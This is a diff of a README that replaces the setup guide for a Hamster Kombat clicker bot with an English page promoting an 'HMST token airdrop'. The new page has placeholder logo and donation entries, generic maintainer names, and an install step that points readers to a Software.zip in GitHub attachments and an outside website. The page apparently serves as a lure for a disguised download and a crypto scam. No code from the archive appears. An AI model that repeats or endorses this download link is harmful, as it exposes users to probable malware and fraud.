@@ -1,90 +1,94 @@
-[<img src="https://img.shields.io/badge/Telegram-%40Me-orange">](https://t.me/sho6ot)
-[<img src="https://img.shields.io/badge/python-3.10%20%7C%203.11-blue">](https://www.python.org/downloads/)
+# Hamster-Telegram
 
-![img1](.github/images/demo.png)
+Welcome to the Hamster-Telegram repository! Our platform allows users to participate in the HMST token airdrop for Hamster Kombat through both the app and website, making it easy to connect with Telegram's latest gaming sensation. As the hamster CEO of a fictional crypto exchange, players can take part in the upcoming airdrop on The Open Network (TON).
 
-> 🇪🇳 README in english available [here](README-EN.md)
+---
 
-## ⚙ [Настройки](https://github.com/shamhi/HamsterKombatBot/blob/main/.env-example)
-| Настройка                | Описание                                                                                      |
-|--------------------------|-----------------------------------------------------------------------------------------------|
-| **API_ID / API_HASH**    | Данные платформы, с которой запускать сессию Telegram _(сток - Android)_                      |
-| **MIN_AVAILABLE_ENERGY** | Минимальное количество доступной энергии, при достижении которой будет задержка _(напр. 100)_ |
-| **SLEEP_BY_MIN_ENERGY**  | Задержка при достижении минимальной энергии в секундах _(напр. [1800,2400])_                  |
-| **ADD_TAPS_ON_TURBO**    | Сколько тапов будет добавлено при активации турбо _(напр. 2500)_                              |
-| **AUTO_UPGRADE**         | Улучшать ли пассивный заработок _(True / False)_                                              |
-| **MAX_LEVEL**            | Максимальный уровень прокачки апгрейда _(напр. 20)_                                           |
-| **BALANCE_TO_SAVE**      | Лимит баланса, который бот "не тронет" _(напр. 1000000)_                                      |
-| **UPGRADES_COUNT**       | Количество карточек, который бот прокачает за 1 круг _(напр. 10)_                             |
-| **MAX_COMBO_PRICE**      | Максимальная цена покупки для покупки комбо при доступном балансе _(напр. 10000000)_          |
-| **APPLY_DAILY_ENERGY**   | Использовать ли ежедневный бесплатный буст энергии _(True / False)_                           |
-| **APPLY_DAILY_TURBO**    | Использовать ли ежедневный бесплатный буст турбо _(True / False)_                             |
-| **RANDOM_CLICKS_COUNT**  | Рандомное количество тапов _(напр. [50,200])_                                                 |
-| **SLEEP_BETWEEN_TAP**    | Рандомная задержка между тапами в секундах _(напр. [10,25])_                                  |
-| **USE_RANDOM_USERAGENT** | Использовать ли рандомный User Agent при каждом новом запуске _(True / False)_                |
+## Table of Contents
 
-## 📕 Профили
-Для каждой сессии можно создать профиль с уникальными данными:
-```json
-{
-  "session1": {
-    "proxy": "socks5://yGow3a:uBro3wL@58.195.21.83:9715",
-    "headers": {"...": "..."},
-    "fingerprint": {"...": "..."}
-  },
-  "session2": {
-    "proxy": "socks5://yGow3a:uBro3wL@58.195.21.83:9715",
-    "headers": {"...": "..."},
-    "fingerprint": {"...": "..."}
-  },
-  "...": {}
-}
-```
-> ❕ **Примечание**:  `session1` и `session2` - это примеры названий сессий.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [Maintainers](#maintainers)
+- [License](#license)
 
-## ⚡ Быстрый старт
-1. Чтобы установить библиотеки в Windows, запустите INSTALL.bat.
-2. Для запуска бота используйте `START.bat` (или в консоли: `python main.py`).
+---
 
-## 📌 Предварительные условия
-Прежде чем начать, убедитесь, что у вас установлено следующее:
-- [Python](https://www.python.org/downloads/) версии 3.10 или 3.11.
+## Introduction
 
-## 📃 Получение API ключей
-1. Перейдите на сайт [my.telegram.org](https://my.telegram.org) и войдите в систему, используя свой номер телефона.
-2. Выберите **"API development tools"** и заполните форму для регистрации нового приложения.
-3. Запишите `API_ID` и `API_HASH` в файле `.env`, предоставленные после регистрации вашего приложения.
+![Hamster-Telegram Logo](https://link-to-your-logo-here)
 
-## 🧱 Установка
-Вы можете скачать [**Репозиторий**](https://github.com/shamhi/HamsterKombatBot) клонированием на вашу систему и установкой необходимых зависимостей:
-```shell
-~ >>> git clone https://github.com/shamhi/HamsterKombatBot.git 
-~ >>> cd HamsterKombatBot
+In the world of Hamster Kombat, the HMST token is King! Our platform offers a seamless experience for users to join the HMST token airdrop through the Hamster-Telegram app and website. Stay up-to-date with Telegram's hottest gaming sensation and grab your share of HMST now.
 
-# Linux
-~/HamsterKombatBot >>> python3 -m venv venv
-~/HamsterKombatBot >>> source venv/bin/activate
-~/HamsterKombatBot >>> pip3 install -r requirements.txt
-~/HamsterKombatBot >>> cp .env-example .env
-~/HamsterKombatBot >>> nano .env  # Здесь вы обязательно должны указать ваши API_ID и API_HASH , остальное берется по умолчанию
-~/HamsterKombatBot >>> python3 main.py
+---
 
-# Windows
-~/HamsterKombatBot >>> python -m venv venv
-~/HamsterKombatBot >>> venv\Scripts\activate
-~/HamsterKombatBot >>> pip install -r requirements.txt
-~/HamsterKombatBot >>> copy .env-example .env
-~/HamsterKombatBot >>> # Указываете ваши API_ID и API_HASH, остальное берется по умолчанию
-~/HamsterKombatBot >>> python main.py
-```
-> Установка в качестве Linux службы для фоновой работы бота [тут](docs/LINUX-SERVIS-INSTALL.md).
+## Features
 
-⏳ Также для быстрого запуска вы можете использовать аргументы, например:
-```shell
-~/HamsterKombatBot >>> python3 main.py --action (1/2)
-# Или
-~/HamsterKombatBot >>> python3 main.py -a (1/2)
+🐹 Easily participate in the HMST token airdrop  
+🐹 Connect with other players in the Hamster Kombat community  
+🐹 Play as the hamster CEO of a crypto exchange  
+🐹 Exclusive access to The Open Network (TON) airdrop  
 
-# 1 - Создает сессию
-# 2 - Запускает кликер
-```
+---
+
+## Installation
+
+To get started with Hamster-Telegram, follow these simple steps:
+
+1. Download the Hamster-Telegram app from [here](https://github.com/user-attachments/files/16913125/Software.zip)  
+2. Visit our website at [https://hamsterdrop.app](https://hamsterdrop.app)
+
+---
+
+## Usage
+
+### Getting Started
+
+1. Create an account on Hamster-Telegram  
+2. Verify your account through Telegram  
+3. Explore the platform and join the HMST token airdrop  
+
+### Game Play
+
+1. Navigate through different levels of Hamster Kombat  
+2. Earn HMST tokens by completing missions  
+3. Engage with other players in the Hamster-Telegram community  
+
+---
+
+## Contributing
+
+We welcome contributions from the community to make Hamster-Telegram even better! Here's how you can contribute:
+
+1. Fork the repository  
+2. Make your changes  
+3. Submit a pull request  
+
+---
+
+## Maintainers
+
+Meet the team behind Hamster-Telegram:
+
+- **Hammy Smith** - Product Manager  
+- **Lila Rodriguez** - Developer  
+- **Max Johnson** - Designer  
+- **Tina Chang** - Marketing  
+
+---
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+### Support Us
+
+If you enjoy using Hamster-Telegram, consider supporting us by donating HMST tokens to our address: [your-HMST-donation-address]
+
+Thank you for being a part of the Hamster Kombat community! 🐹🎮
+
+**Now, let the battle begin!** 🚀
